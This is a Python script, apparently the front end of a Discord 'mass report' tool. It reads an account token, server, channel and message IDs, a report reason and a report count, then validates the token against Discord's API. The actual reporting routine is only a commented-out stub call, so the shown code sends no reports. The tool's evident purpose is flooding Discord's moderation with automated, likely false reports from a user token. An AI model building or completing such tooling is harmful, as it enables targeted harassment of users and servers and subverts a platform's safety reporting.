import os
import requests
from colorama import Fore
from time import sleep

def getheaders(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    return headers

def massreport_action():
    print(f"\n{Fore.LIGHTMAGENTA_EX}(the token you input is the account that will send the reports){Fore.RESET}")
    token = str(input(f'{Fore.BLUE}[{Fore.LIGHTCYAN_EX}>>>{Fore.BLUE}] {Fore.RESET}Token: {Fore.LIGHTMAGENTA_EX}'))
    guild_id1 = str(input(f'{Fore.BLUE}[{Fore.LIGHTCYAN_EX}>>>{Fore.BLUE}] {Fore.RESET}Server ID: {Fore.LIGHTMAGENTA_EX}'))
    channel_id1 = str(input(f'{Fore.BLUE}[{Fore.LIGHTCYAN_EX}>>>{Fore.BLUE}] {Fore.RESET}Channel ID: {Fore.LIGHTMAGENTA_EX}'))
    message_id1 = str(input(f'{Fore.BLUE}[{Fore.LIGHTCYAN_EX}>>>{Fore.BLUE}] {Fore.RESET}Message ID: {Fore.LIGHTMAGENTA_EX}'))
    reason1 = str(input(
        '\n[1] Illegal content\n'
        '[2] Harassment\n'
        '[3] Spam or phishing links\n'
        '[4] Self-harm\n'
        '[5] NSFW content\n\n'

        f'{Fore.BLUE}[{Fore.LIGHTCYAN_EX}>>>{Fore.BLUE}] {Fore.RESET}Reason: {Fore.LIGHTMAGENTA_EX}'))
    if reason1.upper() in ('1', 'ILLEGAL CONTENT'):
        reason1 = 0
    elif reason1.upper() in ('2', 'HARASSMENT'):
        reason1 = 1
    elif reason1.upper() in ('3', 'SPAM OR PHISHING LINKS'):
        reason1 = 2
    elif reason1.upper() in ('4', 'SELF-HARM'):
        reason1 = 3
    elif reason1.upper() in ('5', 'NSFW CONTENT'):
        reason1 = 4
    else:
        print(f"\nInvalid reason")
        sleep(1)
        return

    try:
        Amount = int(input(f'{Fore.BLUE}[{Fore.LIGHTCYAN_EX}>>>{Fore.BLUE}] {Fore.RESET}Amount of reports: {Fore.LIGHTMAGENTA_EX}'))
    except:
        print(f'{Fore.RED}Invalid Amount of reports.{Fore.RESET}')
        sleep(1)
        return

    r = requests.get('https://discord.com/api/v6/users/@me', headers=getheaders(token))
    if r.status_code == 200:
        clear_console()
        # Call the MassReport function from the other script if you have it defined there
        # util.massreport.MassReport(token, guild_id1, channel_id1, message_id1, reason1, Amount)
        print(f"\nCalling the MassReport function here...")

    else:
        print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
        sleep(1)
        return

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')